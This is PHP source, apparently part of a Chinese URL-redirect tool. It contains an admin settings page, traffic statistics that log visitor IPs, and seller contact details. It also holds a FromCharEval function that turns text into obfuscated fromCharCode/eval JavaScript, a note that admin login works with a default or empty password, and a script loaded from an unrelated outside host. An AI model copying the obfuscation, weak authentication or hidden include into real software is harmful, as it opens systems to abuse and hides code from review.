		<tr class="tr_more">
			<td class="left">登录名称</td>
			<td><input class="text" id="user" name="conf[user]" value="<?php echo($conf['user']); ?>" >
				<span>后台的管理用户名，默认密码是admin 123456，可以免密码登陆</span></td>
		</tr>
		<tr class="tr_more">
			<td class="left">管理密码</td>
			<td><input class="text" id="pass" name="conf[pass]" value="<?php echo($conf['pass']); ?>" >
				<span>后台的管理密码</span></td>
		</tr>
		<tr class="tr_more">
			<td class="left">温馨提醒</td>
			<td>
				<ol class="info">
					<li>后台入口是 ?admin=on，<?php echo $confile; ?> 是配置文件。</li>
					<li>简写示例 {W} 随机小写字母；{D} 随机大写字母；{N} 随机数字。</li>
					<li>草料二维码生成美化 <a class="line_act" target="_blank" href="https://cli.im/">打开网址。</a>验证跳转抓取工具 <a class="line_act" target="_blank" href="http://tools.qedns.cn/code/?t=fetch&url=<?php echo urlencode($GLOBALS['json']['home']);?>">打开网址。</a></li>
					<li>当参数设置混乱导致功能障碍无法使用时，请恢复默认。</li>
					<li>网站开发请联系QQ：3379530015 。</li>
				</ol>
			</td>
		</tr>
		<tr >
			<td class="left">操作保存</td>
			<td>
				<input class="butt tr_more" onclick="saveAct(1)" type="button" value="退出系统" >
				<input class="butt tr_more" onclick="saveAct(2)" type="button" formnovalidate value="恢复默认" >
				<input class="butt tr_more" onclick="saveAct(3)" type="button" formnovalidate value="更多工具" >
				<br class="tr_more">
				<input class="butt" onclick="saveAct(0)" type="button" value="保存设置" style="width:433px;background:#6FB934;" >
				<input class="butt" onclick="saveAct(4)" type="button" formnovalidate value="查看更多" >
			</td>
		</tr>
	</table>
</form>
<script src="./images/jquery.min.js"></script>
<script src="https://libs.baidu.com/jquery/1.10.1/jquery.min.js"></script>
<script src="https://cdn.static.runoob.com/libs/jquery/1.10.1/jquery.min.js"></script>
<script type="text/javascript">
$json = <?php echo json_encode($GLOBALS['json']);?>;
$('textarea').each(textareaAutoHeight);
$(function(){
	$('textarea').on('input',textareaAutoHeight);
	$('.set_user').click(function(e){
		$('.tr_more').show();
	});
	$('#user,#pass').on('input change',function(){
		window.changePass = true;
	});
	if($json.msg)tip($json.msg);
})
function textareaAutoHeight(e){
	var val = $(this).val().replace(/^\s+/g,'');
	var arr = val.split(/\n/);
	$(this).css('height',(arr.length*1.2)+'em');
}
function saveAct(act){
	var val= $('#form').serialize();
	if(1 == act){
		return msg('您确认要退出吗!',function(){
			document.cookie='DFDOG=NULL;path=/;expires=' + new Date(0).toUTCString();
			location.href='?admin=on';
		});
	}else if(2 == act){
		return msg('您确认恢复原始吗?重置后无法恢复!!',function(){
			saveAct(-2)
		});
	}else if(-2 == act){
		window.changePass = true;
		val += '&back=恢复默认&';
	}else if(3 == act){
		return open('http://tools.qedns.cn/code/?t=home','_blank');
	}else if(4 == act){
		return $('.tr_more').show();
	}
	$.post('',val,function(d){
		d = dejson(d);
		if(window.changePass){
			setTimeout(function(){
				location.reload();
			},1000);
		}
	});
	return false;
}
//JSON发送
function dejson(d) {
	try {
		if(typeof(d) == 'string') d = JSON.parse(d);
		if(d.tip)tip(d.tip);
		if(d.alert)alert(d.alert);
		if(d.reload)location.reload(); 
		if(d.location)location.href = d.location;
	} catch(e) {
		return {d: d,e: e};
	}
	return d; 
}
function copyText(t) {
	var p = document.createElement('textarea');
	p.value = t;
	p.style.opacity=0;
	document.body.appendChild(p);
	p.select();
	document.execCommand("Copy");
	document.body.removeChild(p);
}
function myChat(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		b = b.toUpperCase();
		for(var i=0;i<b.length;i++){
			if('N'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('D'==b[i]){
				h+=String.fromCharCode(65+Math.floor(Math.random()*26));
			}else{
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
//JS普通弹框
function showInfo(c) {
	$.post('',{c:c},function(d){
		d = dejson(d);
		if(d.text){
			msg(d.text,null,true);
		}
	});
}
//JS普通弹框
function msg(text, fun, type) {
	window.tfun = fun;clearTimeout(window.tmst);
	window.tmsg&&document.body.removeChild(tmsg);
	var h = '<div id="tmsg" style="background:rgba(0,0,0,0.6);position:fixed;left:0;top:0;width:100%;height:100%;z-index:19891015">'+'';
	h += '';
	if(type){
		h += '<div style="margin:200px auto 0;background:#fff;border:solid #aaa 1px;border-radius:5px;width:90%;max-width: 1000px;text-align:center;"><div style="padding:32px 10px 0;color:#4194CC;font-size:12px;line-height:16px;tab-size:4;white-space:pre-wrap;word-break: keep-all;font-family:Consolas,Arial;text-align: left;padding-left: 29px;max-height: 44vh;overflow-y: auto;overflow-x: auto;margin-bottom: 22px;">';
	}else{
		h += '<div style="margin:200px auto 0;background:#fff;border:solid #aaa 1px;border-radius:5px;width:90%;max-width:450px;text-align:center;"><div style="padding:32px 10px;color:#333;font-size:16px;line-height:2;">';
	}
	h += text+'</div><div onclick="document.body.removeChild(tmsg)"><button style="BTNSTYLE;background:#ccc;">取消</button><button style="BTNSTYLE" onclick="tfun();">确定</button></div></div></div>';
	document.body.insertAdjacentHTML('beforeEnd',h.replace(/BTNSTYLE/g,'padding:0px;font-size:14px;font-weight:100;color:#fff;border-style:none;border-color:initial;height:40px;line-height:40px;width:150px;max-width:28vw;cursor:pointer;border-radius:5px;background:#4899E0;margin:0 8px 20px;'));
}
//JQ提示弹框
function tip(text,time){
	var div = $('<div id="tmsg" style="top:300px;left:20%;right:20%;color:#000;margin:0 auto;opacity:0;padding:5px;font-size:15px;max-width:300px;position:fixed;text-align:center;border-radius:8px;background-color:#fff;border:1px solid #666;box-shadow:rgba(0,0,0,0.2) 0px 0px 16px 5px;transition:opacity 0.6s;z-index:19891016">'+text+'</div>');
	$('#tmsg').remove();
	$('body').append(div);
	div.animate({opacity:1});
	setTimeout(function(){
		div.animate({opacity:0},div.remove);
	},time||3000);
}
</script>
<script src="//cheney.ll03.cn/Acc/vCensus/?id=3" ></script>
</body>
</html>
<?php	
}
function getConfig($file){
	if(is_file($file)){
		if(stristr($_SERVER['HTTP_HOST'],'.qedns.cn')){
			header("Content-Type:text/html;charset=utf-8");
			exit('此测试不能正式使用！');
		}
		return include $file;
	}else{
		header("Content-Type:text/html;charset=utf-8");
		exit('<script>alert("没有发现您的设置，请前往后台保存配置！");location.href="?admin=on";</script>');
	}
}
function myChat($url){
	return preg_replace_callback('/\{([NWD]+)\}/iu',function($a){
		$h='';
		$a[1]=strtoupper($a[1]);
		for($i=0;$i<strlen($a[1]);$i++){
			if('N'==$a[1][$i]){
				$h.=mt_rand(0,9);
			}else if('D'==$a[1][$i]){
				$h.=chr(mt_rand(65,90));
			}else if('W'==$a[1][$i]){
				$h.= chr(mt_rand(97,122));
			}
		}
		return $h;
	},$url);
}
function FromCharEval($txt){
	$txt=iconv('UTF-8', 'UCS-2BE', $txt);
	$str	 = '["sojson.v4"][\'\x66\x69\x6c\x74\x65\x72\'][\'\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\']';
	$str	.= '(((["sojson.v4"]+[])[\'\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\']["\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65"]["\x61\x70\x70\x6c\x79"](null,\'';
	for($i = 0; $i < strlen($txt) - 1; $i = $i + 2)$str .= ($i>0?chr(mt_rand(97,122)):'').(ord($txt[$i])*256+ord($txt[$i + 1]));		
	$str	.= '\'["\x73\x70\x6c\x69\x74"](/[a-zA-Z]{1,}/))))("sojson.v4");';
	return $str;
}
class Tongji{
	static function viweSet($data = array()){
		if(empty($data['ip']))$data['ip'] = current(array_filter(array(getenv("HTTP_CLIENT_IP"),getenv("HTTP_X_FORWARDED_FOR"),getenv("REMOTE_ADDR"),$_SERVER['REMOTE_ADDR'])));
		$data['info'] = $data['log'] = $data['table'] = $data['trace'] = $data['desc'] = $data['url'] = '';
		$data['index'] = self::cacheSession('index');
		self::cacheSession('index',$data['index'] = empty($data['index'])?1:intval($data['index'])+1,8640000);
		$data['day'] = date('Y-m-d');
		$data['dom'] = self::shotDom($data['href']);
		$data['ipVisit'] = self::cacheSession($data['ip'].'ip');
		self::cacheSession($data['ip'].'ip',$data['ipVisit'] = empty($data['ipVisit'])?1:intval($data['ipVisit'])+1,86400);
		//日域名统计
		$data['daySet'] = self::cacheSession($data['dom'].$data['day']);
		if(empty($data['daySet']['pv'])){
			$data['daySet'] = array('dom'=>	$data['dom'],'day'=>$data['day'],'pv'=>1,'ip'=>1,'url'=>'');
		}else{
			$data['daySet']['pv']++;
			if(1 == $data['ipVisit']){
				$data['daySet']['ip']++;
			}
		}
		$data['daySet']['url'] = $data['href'];
		self::cacheSession($data['dom'].$data['day'],$data['daySet'] ,864000);
		//总统计
		$data['domSet'] = self::cacheSession($data['dom']);
		if(empty($data['domSet']['pv'])){
			$data['domSet'] = array('name'=> $data['dom'],'dom'=>	$data['dom'],'pv'=>1,'ip'=>1,'url'=>'');
		}else{
			$data['domSet']['pv']++;
			if(1 == $data['ipVisit']){
				$data['domSet']['ip']++;
			}
		}
		$data['domSet']['url'] = $data['href'];
		$data['domSet']['day'][$data['day']] = $data['daySet'];
		self::cacheSession($data['dom'],$data['domSet'] ,864000);
		//域名清单
		$domList = self::cacheSession('domList');
		if(!empty($domList)&&0==$data['index']%10){
			for($di=0;$di<10;$di++){
				$dni = date('Y-m-d',$_SERVER['REQUEST_TIME']-(30+$di)*86400);
				if(isset($data['domSet']['day'][$dni]))unset($data['domSet']['day'][$dni]);
			}
			foreach($domList as $dk=>$dv){
				if(!empty($dv['name'])){
					$dc = self::cacheSession($dv['name']);
					if(!empty($dc))continue;
				}
				unset($domList[$dk]);
			}
		}
		$domList[$data['dom']] = $data['domSet'];
		self::cacheSession('domList',$domList,864000);
		unset($data['domSet']['day']);
		return $data;
	}
	static function viweGet($data = array()){
		$domList = self::cacheSession('domList');
		//生成TRACE
		if(!empty($domList)){
			$list = array();
			$sortip = array();
			$dayname = array('今日','昨日','前日');
			foreach($domList as $dv)$sortip[] = $dv['ip']; 
			array_multisort($sortip,SORT_DESC,$domList);
			$desa = array('ipAll'=>0,'pvAll'=>0);
			foreach($domList as $dv){
				$line = array();
				$line['域名'] = $dv['dom'];
				$line['总计(IP/PV)'] = str_pad($dv['ip'],6,' ').$dv['pv'];
				$desa['ipAll'] += $dv['ip'];
				$desa['pvAll'] += $dv['pv'];
				for($i = 0;$i < 6;$i++){
					$pday = date('Y-m-d',$_SERVER['REQUEST_TIME']-86400*$i);
					$pset = isset($dv['day'][$pday])?$dv['day'][$pday]:array('pv'=>0,'ip'=>0,);
					$prow = isset($dayname[$i])?$dayname[$i]:date('n/j',$_SERVER['REQUEST_TIME']-86400*$i);
					$line[$prow.'(IP/PV)'] = str_pad($pset['ip'],6,' ').$pset['pv'];
					$desa['ip'.$i] = (empty($desa['ip'.$i])?0:$desa['ip'.$i])+$pset['ip'];
					$desa['pv'.$i] = (empty($desa['pv'.$i])?0:$desa['pv'.$i])+$pset['pv'];
				}
				$line['地址'] = $dv['url'];
				$list[] = $line;
			}
			$data['desc'] = "总计({$desa['ipAll']}IP/{$desa['pvAll']}PV); 今日({$desa['ip0']}IP/{$desa['pv0']}PV); 昨日({$desa['ip1']}IP/{$desa['pv1']}PV); 前日({$desa['ip2']}IP/{$desa['pv2']}PV);";
			$data['trace'] = "《流量监控清单》\r\n生成时间：".date('Y-m-d H:i:s')."\r\n统计概况：{$data['desc']}\r\n".self::ListText($list,"\t");
		}
		return $data;
	}
	static function viweTab($data = array()){
		$domList = self::cacheSession('domList');
		if(!empty($domList)){
			$sortip = array();
			$dayname = array('今日','昨日','前日');
			foreach($domList as $dv)$sortip[] = $dv['ip']; 
			array_multisort($sortip,SORT_DESC,$domList);
			$data['table']	 = '<table border="1" cellpadding="4" style="border-collapse:collapse;background:#f5f5f5;">'."\r\n";
			$data['table']	.= '	<tr>'."\r\n";
			$data['table']	.= '		<th rowspan="2">域名</th>'."\r\n";
			$data['table']	.= '		<th colspan="2">总计</th>'."\r\n";
			$headb =  '<th width="50">IP</th><th width="50">PV</th>'."\r\n";
			for($i = 0;$i < 6;$i++){
				$prow = isset($dayname[$i])?$dayname[$i]:date('n/j',$_SERVER['REQUEST_TIME']-86400*$i);
				$data['table']	.= '		<th colspan="2">'.$prow.'</th>'."\r\n";
				$headb .= '		<th width="50">IP</th><th width="50">PV</th>'."\r\n";
			}
			$data['table']	.= '		<th rowspan="2">地址</th>'."\r\n\t</tr>\r\n\t<tr>\r\n\t\t{$headb}\t</tr>\r\n";
			foreach($domList as $dk => $dv){
				$data['table']	.= '	<tr>'."\r\n";
				$data['table']	.= '		<td>'.$dv['dom'].'</td>'."\r\n";
				$data['table']	.= '		<td align="center">'.$dv['ip'].'</td>'."\r\n";
				$data['table']	.= '		<td align="center">'.$dv['pv'].'</td>'."\r\n";
				for($i = 0;$i < 6;$i++){
					$pday = date('Y-m-d',$_SERVER['REQUEST_TIME']-86400*$i);
					$pset = isset($dv['day'][$pday])?$dv['day'][$pday]:array('pv'=>0,'ip'=>0,);
					$data['table']	.= '		<td align="center">'.$pset['ip'].'</td>'."\r\n";
					$data['table']	.= '		<td align="center">'.$pset['pv'].'</td>'."\r\n";
				}
				$data['table']	.= '		<td><a href="'.$dv['url'].'" target="_blank">'.$dv['url'].'</a></td>'."\r\n";
				$data['table']	.= '	</tr>'."\r\n";
			}
			$data['table']	.= "</table>\r\n";
		}
		return $data;
	}
	static function shotDom($url){
		$host = parse_url($url,PHP_URL_HOST);
		if(preg_match('/(\d+\.\d+\.\d+\.\d+)$/',$host,$rep)){
			$dom=$rep[1];	
		}elseif(preg_match('/([\w\-]+\.(com|net|cn)\.(com|net|cn))$/',$host,$rep)){
			$dom=$rep[1];
		}elseif(preg_match('/([\w\-]+\.\w+)$/',$host,$rep)){
			$dom=$rep[1];
		}else{
			$dom=$host;
		}
		if(empty($dom)){
			$dom='127.0.0.1';
		}
		return $dom;
	}
	static function ListText($arr,$sp = "\t"){
		$html	= '';
		$wn = array();
		$kl = current($arr);
		array_unshift($arr,array_keys($kl));
		foreach($arr as $k2=>$v2){
			foreach($kl as $k3=>$v3){
				if(!empty($v2[$k3])&&is_array($v2[$k3]))$arr[$k2][$k3] = json_encode($v2[$k3]);
				$arr[$k2][$k3]=empty($arr[$k2][$k3])?isset($wn[$k3])?'':$k3:$arr[$k2][$k3];
				$len = self::utf_pad($arr[$k2][$k3]);
				$wn[$k3] = max(empty($wn[$k3])?0:$wn[$k3],$len);
			}
		}
		foreach($arr as $k2=>$v2){
			$html .= ltrim($sp);
			foreach($kl as $k3=>$v3){
				$html .= self::utf_pad($arr[$k2][$k3],$wn[$k3]).$sp;		
			}
			$html .= "\r\n";
		}
		return $html;
	}
	static function utf_pad($str,$len=0,$pad=' '){
		$lew = mb_strlen($str,'utf-8')+count(preg_split('/[\x{3020}-\x{9fa5}]/u',$str));
		return empty($len)?$lew:$str.str_pad('',$len - $lew ,$pad);
	}
	//大缓存
	static function cacheSession($name, $val = '', $time = 3600){
		$md5 = md5($name);
		$path = dirname(__FILE__).'/images/~cacheSession/cache-'.substr($md5,0,3).'.php';
		if(is_file($path))$list = @unserialize(substr(file_get_contents($path),14));
		if(empty($list))$list = array();
		if('' === $val){
			if(isset($list[$md5]['expire'])&& $list[$md5]['expire']>$_SERVER['REQUEST_TIME'])return $list[$md5]['value'];
		}else{
			if(!is_array($val) && is_object($val))$val = $val();
			foreach($list as $ckey=>$cval)if($cval['expire']<$_SERVER['REQUEST_TIME'])unset($list[$ckey]);
			$list[$md5] = array('expire'=>$_SERVER['REQUEST_TIME']+$time,'name'=>$name,'value'=>$val);
			if(is_null($val)&&isset($list[$md5]))unset($list[$md5]);
			if(!is_dir(dirname($path)))@mkdir(dirname($path),0777,true);
			@file_put_contents($path, urldecode('<%3Fphp exit%3B %3F>').serialize($list));
		}
		return array();
	}
}
/*
*	技术支持：我们的技术范围有：PHP，JAVASCRIPT，JQUERY，MYSQL，HTML，H5，CSS，THINKPHP，APACHE，NGINX，IIS，图片处理，UI设计，SEO技术顾问等电话：18729480012，企鹅：3379530015。
*/
